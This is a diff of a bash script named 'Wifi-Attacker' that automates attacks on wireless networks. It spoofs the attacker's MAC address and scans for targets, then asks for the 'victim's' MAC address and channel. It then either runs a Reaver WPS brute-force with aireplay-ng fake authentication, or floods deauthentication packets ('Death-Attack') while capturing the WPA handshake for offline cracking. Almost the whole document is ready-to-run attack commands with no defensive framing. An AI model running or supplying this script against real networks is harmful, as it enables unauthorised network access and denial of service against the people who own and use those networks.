@@ -28,6 +28,11 @@ echo -e "\e[1;34mWifi-Attacker"
 echo ''
 sleep 2
 echo -e "$Cyan"
+echo -e "$Red===================================================================="
+echo -e "$Green                          MacChanger                              "
+echo -e "$Red===================================================================="
+sleep 2
+echo -e "$Cyan"
 airmon-ng stop wlan0mon
 airmon-ng stop wlan0
 ifconfig wlan0 down
@@ -37,42 +42,52 @@ airmon-ng start wlan0
 ifconfig  wlan0mon down
 macchanger -r wlan0mon
 ifconfig wlan0mon up
-echo -e "[\] changed Mac-adress Done"
-sleep 1
-echo -e "$Yellow"
-airodump-ng wlan0mon
-echo -e "\e[1m\e[32m Happy hunt!!"
-read -p "what is the vicims Mac-adress: " Mac
-read -p "what is the vicims Chaneel: " Ch
-read -p "what is the vicims Name: " Name
-iwconfig wlan0mon channel $Ch
-echo -e "$BBlue"
+echo -e "[\]Mac-changer Done"
+sleep 3
+echo -e "$Red===================================================================="
+sleep 2
+echo ""
+echo -e "$Cyan"
 read -p "whats the type of attack you choose: 
 [1]reaver
 [2]aireplay-ng
 [3]wifite
 : " Attack
-
+echo -e "$Yellow"
 if [ $Attack -eq 1 ]
 then
-echo ''
 echo -e "$Red===================================================================="
 echo -e "$Green                          Reaver-Attack                           "
 echo -e "$Red===================================================================="
 echo -e '\e[1;33m'
+sleep 2 
+airodump-ng wlan0mon
+sleep 1
+echo -e "\e[1m\e[32m Happy hunt!!"
+sleep 2
+read -p "what is the vicims Mac-adress: " Mac
+read -p "what is the vicims Chaneel: " Ch
+iwconfig wlan0mon channel $Ch
 xterm -e  timeout 3000h aireplay-ng -1 10  -a $Mac -x 100 wlan0mon &
 reaver -i wlan0mon -b $Mac -c $Ch -vv --no-nacks 
-
-
-
 sleep 3 
 fi 
+echo -e "$BBlue"
 if [ $Attack -eq 2 ]
 then
 echo ''
 echo -e "$Red===================================================================="
 echo -e "$Green                          Handshak-Attack                         "
 echo -e "$Red===================================================================="
+airodump-ng wlan0mon
+sleep 1
+echo -e "\e[1m\e[32m Happy hunt!!"
+sleep 2
+read -p "what is the vicims Mac-adress: " Mac
+read -p "what is the vicims Chaneel: " Ch
+read -p "what is the network name: " Name
+sleep 1
+iwconfig wlan0mon channel $Ch
 xterm -T Death-Attack -e timeout  3000h aireplay-ng -0 0 -a  $Mac  wlan0mon &
 airodump-ng --bssid  $Mac  -c $Ch -w /root/handshake/$Name wlan0mon 
 sleep 3 
